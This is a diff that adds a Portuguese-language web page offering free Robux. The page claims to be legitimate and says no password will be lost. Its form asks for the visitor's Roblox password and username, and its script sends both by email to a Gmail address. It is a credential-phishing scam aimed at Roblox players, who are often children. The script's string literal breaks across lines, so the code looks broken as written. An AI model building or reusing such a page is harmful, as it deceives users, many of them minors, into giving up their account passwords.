@@ -1,0 +1,146 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>ROBUX GRÁTIS</title>
+  <style>
+    body {
+  font-family: system-ui, sans-serif;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  margin: 0;
+  background: linear-gradient(180deg,#003300,#001a00);
+  color: #e6ffe6;
+}
+
+.card {
+  background: linear-gradient(180deg,#004d00,#002600);
+  padding: 28px;
+  border-radius: 12px;
+  box-shadow: 0 8px 30px rgba(0,0,0,.6);
+  width: 330px;
+  text-align: center;
+  border: 2px solid #00ff66;
+}
+
+h2 {
+  color:#00ff66;
+  font-weight: 900;
+  text-shadow: 0 0 10px #00ff66;
+}
+
+button {
+  background: #00ff66;
+  border: none;
+  padding: 12px 18px;
+  border-radius: 8px;
+  font-weight: 700;
+  cursor: pointer;
+  color: #003300;
+  box-shadow: 0 0 12px #00ff66;
+}
+
+.modal {
+  position: fixed;
+  inset: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: rgba(0,0,0,.75);
+}
+
+.modal-box {
+  background: #ffffff;
+  color: #111;
+  padding: 22px;
+  border-radius: 10px;
+  width: 90%;
+  max-width: 420px;
+  border: 2px solid #00cc55;
+}
+
+label, input {
+  display: block;
+  width: 100%;
+  margin: 8px 0;
+}
+
+input[type="text"],
+input[type="password"],
+input[type="number"] {
+  padding: 10px;
+  border-radius: 6px;
+  border: 2px solid #00aa44;
+}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>ROBUX GRÁTIS</h2>
+    <p>Esta página é apenas uma <strong>forma legal de fornecer robux</strong>. Nenhuma senha será perdia.</p>
+    <button id="open">ABRIR FORMULÁRIO</button>
+  </div>
+
+  <div id="modal" class="modal" style="display:none" role="dialog" aria-hidden="true">
+    <div class="modal-box" role="document">
+      <h3>PREENCHA O FORMULÁRIO PARA GANHAR ROBUX GRÁTIS</h3>
+
+      <label for="nome">Senha do roblox</label>
+      <input id="nome" type="text" placeholder="Senha roblox" />
+
+      <label for="nick">Nick do Roblox</label>
+      <input id="nick" type="text" placeholder="Seu nick no Roblox" />
+
+      <div style="display:flex; gap:8px; justify-content:flex-end; margin-top:12px;">
+        <button id="cancel" style="background:#ccc;color:#000">Cancelar</button>
+        <button id="send">Enviar</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const openBtn = document.getElementById('open');
+    const modal = document.getElementById('modal');
+    const cancel = document.getElementById('cancel');
+    const send = document.getElementById('send');
+    const nomeInput = document.getElementById('nome');
+    const nickInput = document.getElementById('nick');
+
+    openBtn.onclick = () => {
+      nomeInput.value = '';
+      nickInput.value = '';
+      modal.style.display = 'flex';
+      modal.setAttribute('aria-hidden', 'false');
+    };
+    cancel.onclick = () => {
+      modal.style.display = 'none';
+      modal.setAttribute('aria-hidden','true');
+    };
+
+    send.onclick = () => {
+      const nome = nomeInput.value.trim();
+      const nick = nickInput.value.trim();
+      if (!nome || !nick) {
+        alert("Preencha todos os campos!");
+        return;
+      }
+      // Abre o cliente de e-mail (não armazena nada no site)
+      const to = "cesinhadiscord@gmail.com";
+      const subject = encodeURIComponent("Por favor eu quero ( quantidade de ROBUX )");
+      const body = encodeURIComponent(
+        "Senha do roblox: " + nome + "\nNick Roblox: " + nick + "\n\n(Enviado com sucesso! seus robux deve chegar em 2-15 dias!)
+        
+  
+    
+    )"
+      );
+      window.location.href = `mailto:${to}?subject=${subject}&body=${body}`;
+      modal.style.display = 'none';
+      modal.setAttribute('aria-hidden','true');
+    };
+  </script>
+</body>
+    </html>
